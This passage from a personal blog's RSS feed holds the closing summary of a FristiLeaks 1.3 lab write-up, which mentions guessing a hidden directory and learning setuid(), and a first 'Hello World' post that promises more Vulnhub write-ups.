&lt;p&gt;This is a fairly easy box, although I got stucked for while at the first part because I didn’t guess that fristi was the correct directory.
&lt;br /&gt;
I’ve learnt how to use the setuid() system call, which I think is pretty useful and that I need to take more screenshots before reporting.&lt;/p&gt;
</description>
        <pubDate>Sun, 28 Jun 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/write-ups/fristileaks_1.3_writeup/</link>
        <guid isPermaLink="true">http://localhost:4000/write-ups/fristileaks_1.3_writeup/</guid>
        
        
        <category>write-ups</category>
        
      </item>
    
      <item>
        <title>Hello World!</title>
        <description>&lt;p&gt;Welcome to my blog!
&lt;br /&gt;
This is my first post, which is going to help me test if the blog works correctly and check if I’m using the categories correctly. 
&lt;br /&gt;
Soon I’ll post more content, mainly write-ups about some &lt;a href=&quot;https://www.abatchy.com/2017/02/oscp-like-vulnhub-vms&quot;&gt;OSCP like machines from Vulnhub&lt;/a&gt;, but maybe I’ll post about my projects or other tech related topics.&lt;/p&gt;
</description>
        <pubDate>Fri, 26 Jun 2020 00:00:00 -0400</pubDate>
        <link>http://localhost:4000/misc/hello_world/</link>
        <guid isPermaLink="true">http://localhost:4000/misc/hello_world/</guid>
        
        
        <category>misc</category>
        
      </item>
    
  </channel>
</rss>
